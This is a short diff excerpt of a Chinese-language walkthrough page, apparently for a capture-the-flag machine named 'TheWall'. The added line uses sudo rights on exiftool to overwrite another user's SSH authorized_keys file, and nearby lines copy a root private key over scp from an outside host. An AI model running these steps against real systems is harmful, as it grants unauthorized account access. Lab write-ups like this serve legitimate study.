@@ -20353,6 +20353,7 @@ User www-data may run the following commands on TheWall:
 <pre class="language-bash" data-language="bash"><code class="language-bash">www-data@TheWall:/tmp$ <span class="token function">ls</span>
 <span class="token function">ls</span>
 authorized_keys</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@TheWall:/tmp$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> john exiftool <span class="token parameter variable">-filename</span><span class="token operator">=</span>/home/john/.ssh/authorized_keys authorized_keys</code></pre>
 <p>然后用私钥连接</p>
 <pre class="language-bash" data-language="bash"><code class="language-bash">www-data@TheWall:/tmp$  <span class="token function">scp</span> root@192.168.1.103:/root/.ssh/id_rsa id_rsa
 The authenticity of <span class="token function">host</span> <span class="token string">'192.168.1.103 (192.168.1.103)'</span> can<span class="token string">'t be established.
